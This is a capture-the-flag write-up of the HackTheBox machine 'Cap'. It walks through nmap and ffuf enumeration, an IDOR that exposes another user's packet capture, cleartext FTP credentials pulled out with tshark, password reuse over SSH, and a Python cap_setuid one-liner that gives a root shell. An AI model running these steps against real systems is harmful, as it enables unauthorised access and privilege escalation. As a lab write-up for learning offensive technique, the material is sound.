---
tags:
  - htb
  - writeup
os: linux
difficulty: easy
cve:
techniques:
  - idor
  - packet-capture-analysis
  - password-reuse
  - capabilities-abuse
---

# Cap (Linux)

| Field              | Value           |
| ------------------ | --------------- |
| OS                 | Linux           |
| Difficulty         | Easy            |
| Box IP             | `10.129.190.60` |
| Attacker IP (tun0) | `<attacker-ip>` |

> [!info] Kill Chain
> [[IDOR]] (another user's capture via `/data/0`) → [[Packet Capture Analysis]] (cleartext FTP credentials) → [[Password Reuse]] → SSH as `nathan` → [[Linux Capabilities Abuse]] (`cap_setuid` on `/usr/bin/python3.8`) → **root**

Cap is an easy Linux machine running an HTTP server with administrative functions including network captures. Missing access controls expose an [[IDOR]] that grants access to another user's capture; the capture holds plaintext FTP credentials for the foothold. A misassigned Linux capability then escalates to root.

---

# 1 · Enumeration → [[nmap]]

- `nmap -Pn -sCV 10.129.190.60` → FTP (21, vsftpd 3.0.3), SSH (22, OpenSSH 8.2p1), HTTP (80, Gunicorn, "Security Dashboard").

```
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
80/tcp open  http    Gunicorn
|_http-title: Security Dashboard
```

- `-Pn` → skip host discovery, treat the host as online, scan ports directly.
- SSH and FTP need credentials that are not available yet → only the web dashboard is freely reachable = starting point.
- the dashboard links to `/data/1` → a sequential numeric id in the URL = [[IDOR]] candidate.

## 1.1 IDOR check via fuzzing → [[ffuf]]

```bash
ffuf -u http://10.129.190.60/data/FUZZ -w <(seq 0 100) -mc 200
```

```
1    [Status: 200, Size: 17144]
0    [Status: 200, Size: 17147]
```

- `<(seq 0 100)` enumerates ids 0–100 as the wordlist; `-mc 200` keeps only existing captures.
- `/data/0` and `/data/1` both return 200 → another user's capture (`/data/0`) is reachable without an ownership check = [[IDOR]] confirmed.

# 2 · Foothold

## 2.1 Packet Capture Analysis → [[Packet Capture Analysis]] / [[tshark]]

- the admin's capture `0.pcap` is downloaded from `/data/0` and identified:

```bash
file 0.pcap
# 0.pcap: pcap capture file ... (Linux cooked v1, capture length 262144)
```

- FTP transmits `USER`/`PASS` in cleartext → the credentials are read straight from the packets:

```bash
tshark -r 0.pcap -Y ftp     # -r: read file, -Y: display filter
```

=> user `nathan` and its password recovered.

## 2.2 Password Reuse → [[Password Reuse]]

- the FTP credentials are reused on SSH (no FTP shell needed):

```bash
ssh nathan@10.129.190.60
```

## User flag

```bash
cat ~/user.txt
# <redacted>
```

---

# 3 · Privilege Escalation → [[Linux Capabilities Abuse]]

- capabilities split root's power into fine-grained privileges attached to single binaries; `getcap` reads them → [[getcap]]:

```bash
getcap -r / 2>/dev/null
# /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
# /usr/bin/ping = cap_net_raw+ep
# ...
```

- `-r /` recurses from `/`; `2>/dev/null` drops the permission-denied noise on stderr.
- `/usr/bin/python3.8` carries `cap_setuid` → the process can set its UID to `0` (root).
- exploit: set UID 0 and spawn a shell through that binary:

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

## Root flag

```bash
cat /root/root.txt
# <redacted>
```

---

## Notes / Rabbit Holes

- **IDOR vs. auth**: the app authenticated the session but never checked capture ownership → direct id access to `/data/0`. Category: Broken Access Control (OWASP Top 10 #1).
- **Capability vs. SUID**: `cap_setuid` is finer-grained than the SUID bit ([[SUID Abuse]]) but equally fatal → `os.setuid(0)` succeeds without the binary being SUID root.
- **Wireshark alternative**: the same capture opens in the Wireshark GUI; `tshark` is the headless equivalent, faster for a known filter (`-Y ftp`).
